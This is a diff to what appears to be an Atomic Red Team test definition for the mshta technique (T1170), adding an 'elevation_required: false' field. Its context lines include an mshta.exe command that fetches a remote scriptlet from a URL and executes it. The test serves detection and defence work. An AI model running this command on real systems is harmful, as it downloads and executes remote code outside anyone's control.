@@ -15,6 +15,7 @@ atomic_tests:
       default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/mshta.sct
   executor:
     name: command_prompt
+    elevation_required: false
     command: |
       mshta.exe javascript:a=(GetObject('script:#{file_url}')).Exec();close();
       
